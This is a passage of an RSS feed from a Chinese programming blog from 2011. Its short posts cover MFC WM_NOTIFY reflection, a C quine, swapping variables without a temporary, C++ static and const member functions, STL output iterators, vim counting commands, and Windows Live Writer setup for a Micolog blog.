&lt;/table&gt;
&lt;!--more--&gt;
&lt;p&gt;2.EX&lt;/p&gt;
&lt;p&gt;ON_NOTIFY 和 ON_NOTIFY_EX 以及 ON_NOTIFY_REFLECT 和 ON_NOTIFY_REFLECT_EX&lt;/p&gt;
&lt;p&gt; 区别是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EX 版本的处理函数有 BOOL 型返回值，表示处理的消息是否继续消息传递
返回 TRUE，表示不继续；
返回 FALSE，表示继续，即其他控件可以对它做处理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt; 则 EX 的意思就是把消息重新放到消息循环，继续遍历别的 CmdTargetObject。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt; 大概是这样：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt; 子控件 ON_NOTIFY_REFLECT_EX 返回值 &lt;/th&gt;
&lt;th&gt; 父窗口有 ON_NOTIFY&lt;/th&gt;
&lt;th&gt; 效果 &lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;TRUE&lt;/td&gt;
&lt;td&gt;N&lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被子控件处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TRUE&lt;/td&gt;
&lt;td&gt;Y&lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被子控件处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FALSE&lt;/td&gt;
&lt;td&gt;N&lt;/td&gt;
&lt;td&gt;WM_NOTIFY 只被子控件处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;FALSE&lt;/td&gt;
&lt;td&gt;Y&lt;/td&gt;
&lt;td&gt;WM_NOTIFY 被子控件和父窗口处理 &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Fri, 19 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-19:blog/2011/08/19/vczhong-dui-wm_notifyde-chu-li/</guid><category>windows</category><category>vc</category></item><item><title>终于把博客搞到墙内了！</title><link>http://www.goorockey.com/blog/2011/08/15/zhong-yu-ba-bo-ke-gao-dao-qiang-nei-liao/</link><description>
&lt;p&gt; 终于把 Micolog 搞到墙内了！&lt;/p&gt;
&lt;p&gt; 用 chrome 打开速度很理想！&lt;/p&gt;
&lt;p&gt; 稍微修改一下 Windows Live Writer 的设置也能直接连到博客了！&lt;/p&gt;
&lt;p&gt;======================= 兴奋的分割线 ===============================&lt;/p&gt;
&lt;p&gt; 具体方法参考了：&lt;a href="http://gae.v2find.tk/2011/06/23/micolog-gae-tk.html"&gt;http://gae.v2find.tk/2011/06/23/micolog-gae-tk.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; 但由于 dot.tk 对免费域名有限制：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; 在 90 天内少于 25 名用户访问时 , 免费域名会过期。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; 所以我改在 &lt;a href="a href=" title="http://www.co.cc/"&gt;co.cc&lt;/a&gt; 申请免费域名。&lt;/p&gt;
&lt;p&gt; 操作跟 dot.tk 的对应，只是每次修改设置（如修改 dns 服务器）时并不一定立刻就生效，它也说了最多会在 48 小时内生效。&lt;/p&gt;
&lt;p&gt; 其他都按照链接的方法做就 OK 了。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 15 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-15:blog/2011/08/15/zhong-yu-ba-bo-ke-gao-dao-qiang-nei-liao/</guid><category>blog</category><category>micolog</category></item><item><title>自产生程序</title><link>http://www.goorockey.com/blog/2011/08/08/zi-chan-sheng-cheng-xu/</link><description>
&lt;p&gt; 自产生程序：不通过任何输入，输出自己代码的程序。&lt;/p&gt;
&lt;p&gt; 很多语言都可以写出这样的程序。&lt;/p&gt;
&lt;p&gt;C 版本 ( 只有一行 )：   &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;"char s[] = %c%s%c;int main(){ printf(s, 34, s, 34);return 0;}"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt; &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;34&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 虽然是写出来了，但里面还是有很多值得研究的东西的。 &lt;/p&gt;
&lt;p&gt; 参考资料：&lt;a href="http://www.nyx.net/~gthompso/quine.htm"&gt;http://www.nyx.net/~gthompso/quine.htm&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Mon, 08 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-08:blog/2011/08/08/zi-chan-sheng-cheng-xu/</guid><category>programming</category></item><item><title>小记：不用第三个变量交换两数</title><link>http://www.goorockey.com/blog/2011/08/06/xiao-ji-bu-yong-di-san-ge-bian-liang-jiao-huan-liang-shu/</link><description>
&lt;p&gt; 经典的解法 1:    &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// a 变成 a+b&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;// b 变成原来的 a，因为 a+b-b = a&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="err"&gt;–&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// a 变成原来的 b，因为 a+b-a = b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 存在的问题 : &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt; 太大的话会溢出 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 经典的解法 2:    &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// a 变成 a^b&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// b 变成原来的 a，因为 b^(a^b) = a&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// a 变成原来的 b，因为 a^(a^b) = b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 存在的问题 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="err"&gt;、&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="err"&gt; 的值不能超过对方的位数所能表达的范围 &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 如下面这种情况就会出问题 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x10101010&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// 设此时 int 为 4 个字节 &lt;/span&gt;
&lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x15&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 这个问题已经老生常谈了，不过今天还是遇到一个问题：&lt;/p&gt;
&lt;p&gt; 当两个要交换的数其实是同一个变量（更准确的说是同一个内存）时两种解法都会出错，变量被置 0。&lt;/p&gt;
&lt;p&gt; 原因自己推算即可得出。 &lt;/p&gt;
&lt;p&gt; 所以，我觉得更为保险的方法就是在交换之前先判断 a、b 是否相等，就既提高效率又防止出错。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Sat, 06 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-06:blog/2011/08/06/xiao-ji-bu-yong-di-san-ge-bian-liang-jiao-huan-liang-shu/</guid><category>programming</category></item><item><title>不能同时用static和const修饰一个成员函数</title><link>http://www.goorockey.com/blog/2011/08/02/bu-neng-tong-shi-yong-statiche-constxiu-shi-ge-cheng-yuan-han-shu/</link><description>
&lt;p&gt;1. 普通的成员函数 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 编译器会自动为其添加一个 &lt;code&gt;this 指针 &lt;/code&gt; 作为入参 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 该成员函数能修改成员变量 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2. 在成员函数后面加 &lt;code&gt;const&lt;/code&gt;( 注意是后面！) &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 编译器会自动为其添加一个 &lt;code&gt;const *this 指针 &lt;/code&gt; 作为入参 &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 该成员函数不能修改成员变量 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3. 成员函数加 &lt;code&gt;static&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 编译器不会加 &lt;code&gt;this 指针 &lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 该成员函数不能直接访问成员变量，只能访问静态成员变量 &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 所以在成员函数加 &lt;code&gt;static&lt;/code&gt; 和后面加 &lt;code&gt;const&lt;/code&gt; 是矛盾的，即不能同时这样修饰一个成员函数 .&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 02 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-02:blog/2011/08/02/bu-neng-tong-shi-yong-statiche-constxiu-shi-ge-cheng-yuan-han-shu/</guid><category>cpp</category><category>programming</category></item><item><title>STL中用copy和ostream_iterator输出一个数组</title><link>http://www.goorockey.com/blog/2011/08/02/stlzhong-yong-copyhe-ostream_iteratorshu-chu-ge-shu-zu/</link><description>
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="vi"&gt;#include&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;iostream&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="vi"&gt;#include&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nb"&gt;iterator&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="vi"&gt;#include&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;algorithm&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="nx"&gt;int&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = { 335, 33, 98, 39, 54, 24, 3 };
int nSize = sizeof(a) / sizeof(a&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;);

// 输出数组 a 到标准输出，同时每个元素都以空格为结束（最后一个元素后面也会有空格）
std::copy(a, a + nSize, std::ostream_iterator&lt;span class="nt"&gt;&amp;lt;int&amp;gt;&lt;/span&gt;(std::cout, " "));
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 结果：335 33 98 39 54 24 3&lt;/p&gt;
&lt;p&gt; 一个字：妙！！(^0^)/ &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 02 Aug 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-08-02:blog/2011/08/02/stlzhong-yong-copyhe-ostream_iteratorshu-chu-ge-shu-zu/</guid><category>cpp</category><category>stl</category></item><item><title>vim的统计功能</title><link>http://www.goorockey.com/blog/2011/05/19/vimde-tong-ji-gong-neng/</link><description>
&lt;p&gt; 今天遇到个问题：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt; 想要知道文章里面有多少个单词，要怎么做呢？&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id="vim"&gt; 直接用 vim 的命令 &lt;/h2&gt;
&lt;p&gt; 命令模式下按： &lt;code&gt;g &amp;lt;Ctrl-g&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; 这样命令行上面就会显示全文总的和当前的：行列数、单词数、字节数。&lt;/p&gt;
&lt;p&gt; 如果是在 visual 模式，选中了部分内容再按 &lt;code&gt;g&amp;lt;C-g&amp;gt;&lt;/code&gt;，则显示选择部分的对应信息。&lt;/p&gt;
&lt;p&gt; 更多详见 &lt;code&gt;:h g_ctrl-g&lt;/code&gt; 和 &lt;code&gt;:h v_g_ctrl-g&lt;/code&gt;&lt;/p&gt;
&lt;!--more--&gt;
&lt;h2 id="_1"&gt; 巧用替换功能 &lt;/h2&gt;
&lt;p&gt;1. 统计字段 &lt;/p&gt;
&lt;p&gt; 先来统计某个字段出现的次数，比如要统计 vim, 就是：&lt;code&gt;:%s/vim//gn&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; 然后命令行就会显示 vim 匹配的次数和匹配的行数了。。。(=0=)/&lt;/p&gt;
&lt;p&gt; 好，解释一下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%s&lt;/code&gt; 全文匹配 &lt;/li&gt;
&lt;li&gt;&lt;code&gt;g&lt;/code&gt; 匹配行内所有 &lt;/li&gt;
&lt;li&gt;&lt;code&gt;n&lt;/code&gt; 只显示匹配数，不真正地匹配 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 对了，关键就在与参数 &lt;code&gt;n&lt;/code&gt; 了，哟！！&lt;/p&gt;
&lt;p&gt;2. 统计更多 &lt;/p&gt;
&lt;p&gt; 好，来用 s 的匹配模式统计更多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 统计字符数 &lt;code&gt;:%s/.//gn&lt;/code&gt;  (. 指代字符 )&lt;/li&gt;
&lt;li&gt; 统计单词数 &lt;code&gt;:%s/i+//gn&lt;/code&gt;  (i 指代英文字母，i+ 就是一个或连续多个英文字母，所以就是单词了 )&lt;/li&gt;
&lt;li&gt; 统计行数 &lt;code&gt;:%s/^//gn&lt;/code&gt;  (^ 指代每行第一个非空字符 )&lt;/li&gt;
&lt;li&gt; 精确匹配单词 ( 如 vim) &lt;code&gt;:%s/&amp;lt;vim&amp;gt;//gn&lt;/code&gt;  ( 指代单词的开始，指代单词的结束 )&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(~0~)/ vim 真强大啊，掌声加鬼吼！！&lt;/p&gt;
&lt;p&gt; 更多详见 
&lt;code&gt;:h count-items&lt;/code&gt;
&lt;code&gt;:h su&lt;/code&gt;
&lt;code&gt;:h search-pattern&lt;/code&gt;&lt;/p&gt;
&lt;h2 id="ps"&gt;P.S.&lt;/h2&gt;
&lt;p&gt; 由于我配置了 set hlsearch，每次匹配完都会高亮匹配，直到下一次匹配。 &lt;/p&gt;
&lt;p&gt; 想清除高亮，可以输入命令 &lt;code&gt;:nohl&lt;/code&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Thu, 19 May 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-05-19:blog/2011/05/19/vimde-tong-ji-gong-neng/</guid><category>linux</category><category>vim</category></item><item><title>使用Windows Live Writer写Micolog博文</title><link>http://www.goorockey.com/blog/2011/05/17/shi-yong-windows-live-writerxie-micologbo-wen/</link><description>
&lt;h2 id="live-writer"&gt; 先下载并安装 Live Writer&lt;/h2&gt;
&lt;p&gt; 地址如下 &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;For Xp: &lt;a href="http://explore.live.com/windows-live-writer-xp"&gt;http://explore.live.com/windows-live-writer-xp&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For Other: &lt;a href="http://explore.live.com/windows-live-writer?os=other"&gt;http://explore.live.com/windows-live-writer?os=other&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="_1"&gt; 添加用户：&lt;/h2&gt;
&lt;p&gt;1. 选择 “ 其他日志服务 ”&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 其他日志服务 " src="http://www.goorockey.com/uploads/2011/05/image11-300x254.png"/&gt;&lt;/p&gt;
&lt;!--more--&gt;
&lt;p&gt;2. 设置博客地址、用户名和密码 &lt;/p&gt;
&lt;p&gt; 用户名和密码是 Micolog 管理页面中设置的 rpc 用户和密码 &lt;/p&gt;
&lt;p&gt;&lt;img alt="rpc 用户和密码 " src="http://www.goorockey.com/uploads/2011/05/image21-300x256.png"/&gt;&lt;/p&gt;
&lt;p&gt;3. 设置博客的类型 &lt;/p&gt;
&lt;p&gt; 推介选择 WordPress 2.2+, 发布的 URL 就是 “ 你的博客地址 /rpc”&lt;/p&gt;
&lt;p&gt;&lt;img alt=" 博客类型 " src="http://www.goorockey.com/uploads/2011/05/image31-300x255.png"/&gt;&lt;/p&gt;
&lt;p&gt;4. 之后，等它配置完成就可以用 Live Writer 写 Micolog 了：）&lt;/p&gt;
&lt;h2 id="_2"&gt; 要注意的地方：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt; 更改了博客主题后，要及时更新 Live Writer 的账户配置 :&lt;/p&gt;
&lt;p&gt;【日志】-【编辑日志设置】，选择 “ 更新账户配置 ”。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt; 设置自动保存和标题提醒 :&lt;/p&gt;
&lt;p&gt;【工具】-【选项】-【编辑】，勾选 “ 自动保存草稿间隔 ”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=" 自动保存草稿间隔 " src="http://www.goorockey.com/uploads/2011/05/image41-300x285.png"/&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt; 再选择【首选项】标签，勾选 “ 发布前提醒我指定标签 ”&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img alt=" 发布前提醒我制定标签 " src="http://www.goorockey.com/uploads/2011/05/image51-300x287.png"/&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 添加 Ping 服务器 &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt; 为了让新博文发布后能被人即时知道，可以设置 Ping 服务器 &lt;/p&gt;
&lt;p&gt; 注意 Ping 服务器的添加是在精不在多，太多无谓的 Ping 服务器只会徒增博文发布的时间。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;【工具】&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="err"&gt;【选项】&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="err"&gt;【&lt;/span&gt;&lt;span class="n"&gt;Ping&lt;/span&gt;&lt;span class="err"&gt; 服务器】&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 以下是我的 Ping 服务器：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//www.feedsky.com/api/RPC2&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//ping.baidu.com/ping/RPC2&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//blogsearch.google.com/ping/RPC2&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//www.zhuaxia.com/rpc/server.php&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//www.xianguo.com/xmlrpc/ping.php&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//so.blog.qihoo.com/pingblog.html&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//api.my.yahoo.com/RPC2&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//search.msn.com/docs/submit.aspx&lt;/span&gt;
&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//www.sogou.com/feedback/blogfeedback.php&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt; 由于 GFW，使得无法直接连接 appspot.com，我的话是用 VPN 来解决的。&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">goorockey</dc:creator><pubDate>Tue, 17 May 2011 00:00:00 +0800</pubDate><guid>tag:www.goorockey.com,2011-05-17:blog/2011/05/17/shi-yong-windows-live-writerxie-micologbo-wen/</guid><category>micolog</category><category>blog</category></item></channel></rss>